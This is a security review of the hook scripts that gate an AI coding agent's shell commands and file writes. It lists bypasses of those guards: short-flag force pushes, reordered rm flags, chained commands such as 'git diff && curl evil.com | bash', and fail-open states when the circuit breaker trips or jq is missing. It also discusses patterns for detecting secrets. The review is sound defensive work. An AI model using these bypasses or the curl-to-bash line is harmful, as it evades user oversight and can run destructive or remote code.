# Hook System Review -- kernel-claude

**Reviewed:** 2026-05-28
**Files:** 16 hook scripts + hooks.json
**Scope:** Safety gates, correctness, robustness, agentdb consistency

---

## CRITICAL (2)

### C1: detect-secrets.sh misses real Anthropic API key format
File: hooks/scripts/detect-secrets.sh:26
Problem: Real Anthropic API keys follow the pattern sk-ant-api03-<base64>, where after the sk-ant- prefix another hyphen appears at position 3. The pattern sk-ant-[a-zA-Z0-9]{20,} requires 20+ consecutive alphanumeric chars immediately after sk-ant-. Since the real format has ant-api03-... the alphanumeric run ends at 3 chars (api). The broader sk-[a-zA-Z0-9]{20,} pattern (line 14) also misses because the character after sk- is a, n, t, then a hyphen -- never 20 consecutive alphanumerics before the first hyphen.
Fix: Change to sk-ant-[a-zA-Z0-9_-]{20,} to allow hyphens in the key body. Review sk-proj- for same issue.

### C2: Circuit breaker causes fail-open on safety gates
File: hooks/scripts/circuit-breaker.sh:35-36
Problem: When the circuit breaker trips (3 consecutive failures) it exits 0, meaning allow the tool call in Claude Code PreToolUse semantics. Both guard-bash.sh and detect-secrets.sh source circuit-breaker.sh. If either guard errors 3 times (jq unavailable, internal error), all bash commands and writes are silently allowed for 10 minutes. Safety gates must fail-closed (exit 2 = block). Violates I0.15.
Fix: Remove source circuit-breaker.sh from guard-bash.sh and detect-secrets.sh. Add explicit jq availability check that exits 2 when jq is missing. Circuit breaker is appropriate for non-blocking observability hooks but not for blocking guards.

---

## HIGH (3)

### H1: guard-bash.sh misses short-form flag and flag-after-branch variants for force push
File: hooks/scripts/guard-bash.sh:14
Problem: The command git push shortflag origin main (where shortflag is the single-letter -f) and git push origin main --force both bypass the guard. The single-letter flag is the most common real-world form used by developers.
Fix: Rewrite pattern to catch both -f and --force in any position relative to the branch name.

### H2: guard-bash.sh rm guard is trivially bypassable
File: hooks/scripts/guard-bash.sh:20
Problem: Multiple bypass forms confirmed: flag order -fr instead of -rf (MISSED); --no-preserve-root flag before path (MISSED); absolute paths other than root-only (MISSED); path traversal forms (MISSED). The guard only blocks rm with -rf against / and ~/. If this minimal scope matches the comment intent (Minimal guardrails) that is accurate. If broader protection is needed the pattern requires flag-order-independent matching.
Fix (if broader scope): Match both -rf and -fr flag orderings, match any absolute path.

### H3: auto-approve-safe.sh auto-approves commands chained after safe git commands
File: hooks/scripts/auto-approve-safe.sh:15
Problem: A command that starts with git status; followed by anything destructive gets auto-approved because the regex is anchored at start but not end. Same for git log | xargs <destructive> and git diff && curl evil.com | bash. The start-of-string anchor prevents prefix injection but does nothing about suffixes.
Fix: Require no shell metacharacters after the safe git prefix. Anchor the pattern at end of string and disallow semicolons, pipes, ampersands, and backticks in the suffix.

---

## MEDIUM (4)

### M1: jq-missing causes fail-open in both safety guards
File: hooks/scripts/guard-bash.sh:9-11, hooks/scripts/detect-secrets.sh:9-11
Problem: When jq is not installed, COMMAND/CONTENT becomes empty string and both guards exit 0 (allow). common.sh:6 warns about missing jq but does not block.
Fix: Add jq availability check at top of both guard scripts that exits 2 (block) when jq is missing.

### M2: ACTIVE_GOAL and RECENT_FILES not JSON-escaped before write-end CLI call
File: hooks/scripts/pre-compact-commit.sh:128
Problem: ACTIVE_GOAL (from SQLite) and RECENT_FILES (from git diff output) are interpolated directly into a JSON string for agentdb write-end. If either contains a double-quote or backslash the JSON payload is malformed or content is injected. The SQL-escaped _ACTIVE_GOAL variants are used correctly for the sqlite3 heredoc (lines 133-157) but NOT for the write-end CLI call at line 128.
Fix: Build the JSON payload using jq -n with --arg flags to safely escape all values.

### M3: session-end.sh auto-pushes to main without I0.8 carve-out comment
File: hooks/scripts/session-end.sh:89
Problem: git push runs unconditionally on the current branch including main. CLAUDE.md I0.8 states push to main requires explicit user confirmation. The --no-verify usage at line 88 has an explicit documented carve-out comment; the git push at line 89 has no equivalent.
Fix: Add a carve-out comment at line 89 explaining the SessionEnd push exception to I0.8, parallel to the no-verify comment block at lines 85-88.

### M4: Lifecycle hooks use set -eo pipefail without -u
File: hooks/scripts/session-start.sh:2, session-end.sh:2, pre-compact-commit.sh:2
Problem: Missing -u means unbound variables silently expand to empty string. STALE_COUNT, ERROR_COUNT, SESSION_DURATION_MS arithmetic could produce wrong results if assignments fail.
Fix: Add -u to the set line in all three files and add default fallbacks throughout.

---

## LOW (3)

### L1: TLS certificate pattern causes false positives on test fixtures
File: hooks/scripts/detect-secrets.sh:25
Problem: PEM-encoded certificates appear routinely in test fixtures and documentation. A certificate without its private key is not a secret. This blocks legitimate writes to test cert files.
Fix: Remove the BEGIN CERTIFICATE pattern. Keep BEGIN PRIVATE KEY variants. Add BEGIN OPENSSH PRIVATE KEY and BEGIN ENCRYPTED PRIVATE KEY.

### L2: validate-structure.sh uses set -e without pipefail
File: hooks/scripts/validate-structure.sh:5
Problem: set -e without pipefail silently masks pipeline failures. Script is async so it does not block writes but structural validation is silently skipped on pipe errors.
Fix: Change set -e to set -eo pipefail.

### L3: _gh_get_profile reads most-recently-modified cache not current project cache
File: hooks/scripts/github-integration.sh:69-76
Problem: ls -t profile-* picks the most recently-written profile cache regardless of project. In a multi-project workspace the wrong project profile could gate GitHub posting decisions.
Fix: Accept project_root parameter and look up the hash-keyed cache file specific to that project remote URL, consistent with detect_profile keying logic.

---

## What is solid -- do not touch

1. --no-verify carve-outs correctly scoped: Only session-end.sh:88 and pre-compact-commit.sh:110 use --no-verify. Both have explicit inline comment blocks explaining the infinite-loop rationale. No other script uses it.
2. agentdb API usage is current: All hooks call agentdb preflight, read-start, write-end, emit. No references to old schema.sql, pending_migration, or pre-migration init patterns. The preflight:ok string match in session-start.sh:177 is correct for current output format.
3. exit 2 semantics correct: detect-secrets.sh and guard-config.sh use exit 2 to signal blocking in Claude Code PreToolUse semantics.
4. guard-config.sh allowlist is tight: Correctly scopes .claude/ writes to only config files. projects/.*/memory/.* allowance is intentional for auto-memory writes.
5. Secret-unstaging before batch commit: git reset with .env*, *.pem, *.key, credentials*, secrets* patterns covers common sensitive files before the session-end commit.
6. Telemetry is fire-and-forget: All agentdb emit calls use background execution. No hook blocks a session on telemetry.
7. post-compact-restore fallback session-start: The .current agent file check correctly handles the Claude Code SessionStart-not-firing edge case.
8. detect_vaults env var override: KERNEL_VAULTS takes priority over filesystem detection enabling clean testing.

---

## Verdict: NEEDS-FIXES

CRITICAL: Real Anthropic API keys are not caught by any pattern in detect-secrets.sh (C1). Circuit breaker trips on safety guards causing fail-open for 10 minutes (C2). Both must be fixed before this system is I0.15-compliant.
HIGH: Short-form flag force push to main is not blocked (H1). rm guard has multiple bypass forms (H2). auto-approve-safe.sh auto-approves chained destructive commands (H3).
